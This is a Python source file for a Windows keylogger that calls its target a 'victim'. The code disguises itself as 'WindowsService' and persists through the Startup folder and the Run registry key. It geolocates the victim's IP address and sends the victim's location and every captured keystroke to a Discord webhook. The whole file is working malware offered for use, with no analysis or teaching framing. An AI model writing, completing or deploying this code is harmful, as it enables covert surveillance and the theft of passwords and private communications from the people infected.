import os
import sys
import time
import threading
from pynput import keyboard
import requests
import signal
import atexit
import winreg as reg
import shutil

WEBHOOK_URL = ""
CURRENT_TEXT = ""
LAST_KEY_TIME = time.time()
CAPS_LOCK = False
SHUTDOWN_FLAG = False

# Persistence
def add_persistence():
    exe_path = os.path.abspath(sys.argv[0])
    name = "WindowsService"
    
    startup = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', name + ".exe")
    if not os.path.exists(startup):
        try:
            shutil.copyfile(exe_path, startup)
        except:
            pass
    
    try:
        key = reg.HKEY_CURRENT_USER
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        reg_key = reg.OpenKey(key, key_path, 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(reg_key, name, 0, reg.REG_SZ, startup)
        reg.CloseKey(reg_key)
    except:
        pass

# Send to Discord
def send_to_discord(message):
    if not WEBHOOK_URL or not message:
        return
    try:
        data = {'content': message}
        requests.post(WEBHOOK_URL, json=data, timeout=5)
    except:
        pass

# Get IP + Geo
def get_victim_info():
    try:
        ip = requests.get('https://api.ipify.org', timeout=10).text
    except:
        ip = "Unknown IP"
    
    try:
        geo = requests.get(f'http://ip-api.com/json/{ip}', timeout=10).json()
        city = geo.get('city', 'Unknown')
        country = geo.get('country', 'Unknown')
        lat = geo.get('lat', 'N/A')
        lon = geo.get('lon', 'N/A')
        map_link = f"https://www.google.com/maps?q={lat},{lon}" if lat != 'N/A' else 'N/A'
    except:
        city = country = lat = lon = map_link = 'Unknown'
    
    return ip, city, country, lat, lon, map_link

# Send online notification
def send_online_notification():
    ip, city, country, lat, lon, map_link = get_victim_info()
    message = (
        "**Victim Online** 📡\n\n"
        f"**IP Address**: `{ip}`\n"
        f"**Location**: {city}, {country}\n"
        f"**Coordinates**: Lat {lat}, Lon {lon}\n"
        f"[**Open in Google Maps**]({map_link})\n"
        "Keylogger active. Waiting for keystrokes..."
    )
    send_to_discord(message)

if __name__ == "__main__":
    add_persistence()
    send_online_notification()  # Instant notification pag na-run

def cleanup():
    global SHUTDOWN_FLAG
    
    if SHUTDOWN_FLAG:
        return
    
    SHUTDOWN_FLAG = True
    
    if CURRENT_TEXT:
        send_to_discord(f"FINAL TEXT BEFORE EXIT: {CURRENT_TEXT}")
    
    if 'keyboard_listener' in globals() and keyboard_listener.is_alive():
        keyboard_listener.stop()

def signal_handler(sig, frame):
    cleanup()
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)
atexit.register(cleanup)

def process_text():
    global CURRENT_TEXT
    while not SHUTDOWN_FLAG:
        try:
            if CURRENT_TEXT and time.time() - LAST_KEY_TIME > 5:
                send_to_discord(f"TYPED TEXT: {CURRENT_TEXT}")
                CURRENT_TEXT = ""
            time.sleep(2)
        except:
            if not SHUTDOWN_FLAG:
                time.sleep(2)

def on_press(key):
    global CURRENT_TEXT, LAST_KEY_TIME, CAPS_LOCK
    
    if SHUTDOWN_FLAG:
        return False
    
    LAST_KEY_TIME = time.time()
    
    try:
        if key == keyboard.Key.caps_lock:
            CAPS_LOCK = not CAPS_LOCK
        
        elif key == keyboard.Key.space:
            CURRENT_TEXT += ' '
        
        elif key == keyboard.Key.enter:
            send_to_discord(f"TYPED TEXT: {CURRENT_TEXT}")
            CURRENT_TEXT = ""
        
        elif key == keyboard.Key.backspace:
            if CURRENT_TEXT:
                CURRENT_TEXT = CURRENT_TEXT[:-1]
        
        elif hasattr(key, 'char') and key.char:
            if CAPS_LOCK:
                CURRENT_TEXT += key.char.upper()
            else:
                CURRENT_TEXT += key.char
        
        else:
            special_keys = {
                keyboard.Key.tab: '[TAB]',
                keyboard.Key.esc: '[ESC]',
                keyboard.Key.f1: '[F1]',
                keyboard.Key.f2: '[F2]',
                keyboard.Key.f3: '[F3]',
                keyboard.Key.f4: '[F4]',
                keyboard.Key.f5: '[F5]',
                keyboard.Key.f6: '[F6]',
                keyboard.Key.f7: '[F7]',
                keyboard.Key.f8: '[F8]',
                keyboard.Key.f9: '[F9]',
                keyboard.Key.f10: '[F10]',
                keyboard.Key.f11: '[F11]',
                keyboard.Key.f12: '[F12]',
                keyboard.Key.delete: '[DEL]',
                keyboard.Key.insert: '[INS]',
                keyboard.Key.home: '[HOME]',
                keyboard.Key.end: '[END]',
                keyboard.Key.page_up: '[PGUP]',
                keyboard.Key.page_down: '[PGDN]',
                keyboard.Key.up: '[UP]',
                keyboard.Key.down: '[DOWN]',
                keyboard.Key.left: '[LEFT]',
                keyboard.Key.right: '[RIGHT]',
            }
            if key in special_keys:
                CURRENT_TEXT += special_keys[key]
                
    except:
        pass

try:
    keyboard_listener = keyboard.Listener(on_press=on_press)
    keyboard_listener.start()
    threading.Thread(target=process_text, daemon=True).start()
    while not SHUTDOWN_FLAG:
        time.sleep(1)
except:
    cleanup()
finally:
    cleanup()